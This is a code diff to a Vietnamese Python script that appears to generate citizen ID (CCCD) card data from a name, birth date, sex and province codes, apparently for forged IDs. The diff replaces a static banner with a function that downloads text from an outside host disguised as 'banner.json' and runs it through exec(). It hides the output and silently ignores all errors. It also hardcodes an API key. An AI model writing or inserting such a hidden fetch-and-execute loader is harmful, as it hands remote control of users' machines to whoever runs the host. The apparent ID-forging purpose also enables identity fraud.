@@ -26,31 +26,32 @@ kt_code = "</>"
 dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
 vua = "\033[1;31m\033[1m\033[1m[\033[1;37m\033[1m=.=\033[1;31m\033[1m\033[1m] \033[1;37m\033[1m=> \033[1;32m\033[1m"
 
-os.system('cls' if os.name == 'nt' else 'clear')    
-dau="\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩"
-banner = f"""
-\033[1;33m╔═══════════════════════════════════════════════╗
-\033[1;33m║\033[1;35m██╗░░██╗██████╗██████═╗░██╗░░░░██░░░░██╗██████╗\033[1;33m║
-\033[1;33m║\033[1;33m██║░░██║██░░░░║██░░░██╝░██║░░░░░██░░██╔╝██░░░░║\033[1;33m║
-\033[1;33m║\033[1;39m███████║██████║██████╚╗░██║░░░░░░████╔╝░██████║\033[1;33m║
-\033[1;33m║\033[1;36m██╔══██║██░░░░║██╔══██╚╗██║░░░░░░░██╔╝░░░░░░██║\033[1;33m║
-\033[1;33m║\033[1;32m██║░░██║██████║██║░░░██║███████╗░░██║░░░██████║\033[1;33m║ 
-\033[1;33m║\033[1;30m╚═╝░░╚═╝╚═════╝╚═╝░░░╚═╝╚══════╝░░╚═╝░░░╚═════╝\033[1;33m║ 
-\033[1;33m║\033[1;30m░░░░╔██═╗░░╔███╗░░╔═██╗░░██═╗░░░██████═╗░░░░░░░\033[1;33m║ 
-\033[1;33m║\033[1;31m░░░░╚╗██╚╗╔╝███╚╗╔╝██╔╝░████╚╗░░██░░░██╝░░░░░░░\033[1;33m║ 
-\033[1;33m║\033[1;32m░░░░░╚╗██╚╝██░██╚╝██╔╝░██░░██╚╗░██████╚╗░░░░░░░\033[1;33m║ 
-\033[1;33m║\033[1;33m░░░░░░╚╗████╔═╗████╔╝░████████╚╗██╔══██╚╗░░░░░░\033[1;33m║ 
-\033[1;33m║\033[1;34m░░░░░░░╚╗██╔╝░╚╗██╔╝░██╔═════██║██║░░░██║░░░░░░\033[1;33m║ 
-\033[1;33m║\033[1;35m░░░░░░░░╚══╝░░░╚══╝░░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░░░░\033[1;33m║ 
-\033[1;33m╠═══════════════════════════════════════════════╣
-\033[1;33m║\033[1;34m▶ Nhóm Zalo  : \033[1;35mzalo.me/g/rbpywb976             \033[1;33m║
-\033[1;33m║\033[1;34m▶ FaceBook : \033[1;35mfacebook.com/QuanHau210           \033[1;33m║
-\033[1;33m║\033[1;34m▶ Zalo : \033[1;35m0961386638                            \033[1;33m║
-\033[1;33m║\033[1;34m▶ Mua Key Vip Cứ Liên Hệ Zalo Nhé              \033[1;33m║
-\033[1;33m║\033[1;34m▶ Nếu Có Lỗi Vui Lòng Báo Cho Facebook Nhé     \033[1;33m║
-\033[1;33m╚═══════════════════════════════════════════════╝
-\033[1;32m-------------------------------------------------"""
-print(banner)
+import os
+import requests
+import io
+import contextlib
+
+# URL to fetch Python code from
+url = "https://keyherlyswar.x10.mx/banner.json"
+
+def run_python_from_web(url):
+    try:
+        # Download the Python code from the URL
+        response = requests.get(url)
+        response.raise_for_status()  # Check for HTTP errors
+        code = response.text
+
+        # Capture output using StringIO
+        output = io.StringIO()
+        with contextlib.redirect_stdout(output):  # Redirect stdout to output
+            exec(code)  # Execute the downloaded code
+
+        # Print the captured output
+        print(output.getvalue())
+    
+    except Exception as e:
+        pass
+run_python_from_web(url)
 print(f"{vua}{do}Lưu Ý : Phải Nhập Đầy Đủ Mới Lưu Ảnh Được")
 ma_tinh = {
     'Bắc Kạn': '006',
@@ -443,6 +444,7 @@ def tao_cccd(dia_chi, gioi_tinh, ngay_sinh):
 
 data = {}
 
+data["apikey"] = ("manhhung001")
 data["name"] = input(f"{vua}Nhập tên: {vang} ")
 data["birthday"] = input(f"{vua}Nhập ngày sinh (dd/mm/yyyy): {vang} ")
 data["sex"] = input(f"{vua}Nhập giới tính: {vang} ")
